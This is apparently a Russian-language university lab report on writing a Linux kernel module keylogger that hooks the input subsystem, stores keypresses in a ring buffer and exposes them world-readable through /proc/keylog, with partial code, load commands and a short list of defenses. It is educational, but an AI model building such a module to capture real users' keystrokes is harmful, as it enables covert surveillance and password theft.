## Цель работы
Целью лабораторной работы является создание модуля ядра Linux, перехватывающего события клавиатуры с использованием input subsystem и предоставляющего их содержимое пользователю через интерфейс /proc.

В результате необходимо:
- понять работу input subsystem ядра Linux; 
- научиться регистрировать обработчики событий ввода; 
- реализовать кольцевой буфер в пространстве ядра; 
- создать интерфейс в /proc; 
- обеспечить потокобезопасность внутри модуля; 
- осознать риски и методы защиты от keylogger-ов.

## Теоретические сведения
### Input subsystem в ядре Linux
Клавиатура обрабатывается подсистемой Generic Linux Input Layer, расположенной в пространстве ядра.
Устройства ввода генерируют события типа:
- EV_KEY — нажатие/отпускание клавиши 
- EV_REL — относительное движение мыши 
- EV_ABS — абсолютные координаты (тачскрины)

Для клавиатуры используется структура:
```c
struct input_event {
struct timeval time;
__u16 type;   // тип события: EV_KEY
__u16 code;   // код клавиши: KEY_A, KEY_1 и др.
__s32 value;  // 1 — нажата, 0 — отпущена, 2 — автоповтор
};
```

### Отличие нажатия от отпускания
value	Значение  
1	клавиша нажата  
0	клавиша отпущена  
2	автоповтор

В keylogger фиксируются только нажатия (value == 1).

## Архитектура решения
### Схема работы
Модуль регистрирует input handler (input_register_handler).
Handler подписывается на устройства, поддерживающие EV_KEY.
При каждом событии вызывается callback → символ записывается в кольцевой буфер.
Буфер читается пользователем через /proc/keylog.

### Кольцевой буфер
Используется массив фиксированного размера:
```
#define BUF_SIZE 4096
static char keybuf[BUF_SIZE];
С двумя индексами:
write_pos
read_pos
```

Поведение при переполнении: старые символы вытесняются.

### Потокобезопасность
Для защиты структуры от одновременного доступа используется:
spinlock_t buffer_lock;  
Причины выбора:

- обработчик событий вызывается в атомарном контексте;
- sleep невозможен → mutex нельзя использовать.

### /proc интерфейс
Создаётся файл:
/proc/keylog

С использованием:
proc_create("keylog", 0444, NULL, &proc_ops)

Чтение реализовано через:
proc_read()

## Реализация

Ниже приведены основные компоненты.

### Регистрация input handler
```
struct input_handler keylogger_handler = {
   .event    = keylogger_event,
   .connect  = keylogger_connect,
   .disconnect = keylogger_disconnect,
   .name = "keylogger",
   .id_table = keylogger_ids,
};
```

### Обработчик событий
```
static void keylogger_event(struct input_handle *handle,
unsigned int type, unsigned int code, int value) {
   if (type == EV_KEY && value == 1) {
      char c = keycode_to_char(code);
      ring_buffer_write(c);
   }
}
```

### Реализация /proc чтения
```
ssize_t proc_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos) {
   return ring_buffer_read(ubuf, count, ppos);
}
```

### Makefile
```
obj-m += keylogger.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
## Тестирование
### Компиляция
```bash
make
```

### Загрузка модуля
```bash
sudo insmod keylogger.ko
```
Проверка:
```bash
dmesg | tail
```
Вывод:

      keylogger: loaded
      keylogger: attached to AT Translated Set 2 keyboard

### Просмотр логов
```bash
cat /proc/keylog
```
Например: hello world123

### Онлайн-наблюдение
```bash
watch -n 0.2 cat /proc/keylog
```

### Выгрузка
```bash
sudo rmmod keylogger
```

## Меры защиты от keylogger’ов
- Проверка lsmod - Любой загруженный модуль виден 
- Проверка /proc/bus/input/handlers - Видны все input handlers 
- Использование secure boot - Блокирует загрузку неподписанных модулей 
- Мониторинг integrity - IMA/EVM предотвращает подмену модулей 
- Ограничение root доступа - Keylogger требует root

## Выводы
В ходе работы:
- изучены механизмы input subsystem Linux; 
- реализован модуль ядра, перехватывающий клавиатурный ввод; 
- создан безопасный потокобезопасный кольцевой буфер в ядре; 
- настроен интерфейс /proc для вывода данных; 
- протестирована работа keylogger’а на реальном Linux-ядре.

Работа демонстрирует риски и возможности kernel-уровня, а также важность контроля загрузки модулей и мониторинга целостности системы.